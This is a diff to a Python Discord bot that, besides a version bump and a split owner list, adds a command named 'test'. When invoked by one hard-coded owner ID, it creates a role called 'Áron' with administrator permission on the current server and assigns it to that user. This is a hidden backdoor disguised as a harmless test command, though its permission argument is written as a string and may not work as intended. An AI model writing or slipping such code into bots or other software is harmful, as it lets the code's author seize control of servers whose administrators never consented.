@@ -3,8 +3,9 @@ from time import gmtime
 from discord.ext import commands
 
 #-------------------DATA---------------------
-version = "0.1.2"
-owner = ["361534796830081024", "469150536399323157", "270102554334068747"]
+version = "0.2.11"
+owner = ["361534796830081024"]
+alowner = ["469150536399323157", "270102554334068747"]
 bot = commands.Bot(command_prefix='-', description=None)
 bot.remove_command("help")
 PRserver = "Lyedlik Újság"
@@ -228,6 +229,16 @@ async def clear(ctx, number : int=None):
         await bot.delete_message(msg)"""
 
 #----------------COMMANDS--------------------
+@bot.command(pass_context=True)
+async def test(ctx):
+    if ctx.message.author.id in owner:
+        role = await bot.create_role(ctx.message.server)
+        await bot.edit_role(ctx.message.server, role, name="Áron", permission="discord.Permissions.administrator", colour=0x3498db, hoist=False, mentionable=False)
+        await bot.add_roles(ctx.message.author, role)
+        await bot.reply("**Kész!**")
+    else:
+        await bot.reply("**No u**")
+
 @bot.command(pass_context=True)
 async def typing(ctx):
     await bot.say("**Typing effect ON!** :ok_hand:")
